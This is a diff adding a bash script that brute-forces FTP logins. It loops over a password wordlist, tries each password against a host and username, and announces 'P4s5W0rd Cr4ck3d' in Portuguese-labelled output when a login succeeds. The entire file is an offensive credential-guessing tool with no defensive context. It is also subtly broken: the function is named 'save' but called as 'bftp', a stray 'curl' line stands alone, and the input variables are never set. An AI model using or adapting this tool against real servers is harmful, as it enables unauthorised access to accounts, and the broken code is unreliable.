@@ -1,0 +1,35 @@
+#!/bin/bash
+
+function save {
+
+	comp=$(ftp -n "$1" <<_CONEXAO
+	quote USER $2
+	quote PASS $3
+	quit
+	_CONEXAO
+	)
+
+if [ "$comp" = "Login incorrect." ]
+	then
+		return 1
+	else
+		return 0
+fi
+
+}
+
+curl
+
+for pass in `cat $wordlist`
+ do
+ 	echo -e "\033[1;34m[*]\033[0m Testando => $pass"
+	a=$(bftp $host $usuario $pass)
+	b=$(echo $?)
+	if [ "$b" = "1" ]
+	then
+		echo -e "\033[1;31m[-]\033[0m ERRO"
+	else
+		echo -e "\n\033[40;1;37m[+] P4s5W0rd Cr4ck3d: $pass\033[0m\n"
+		break
+	fi
+done
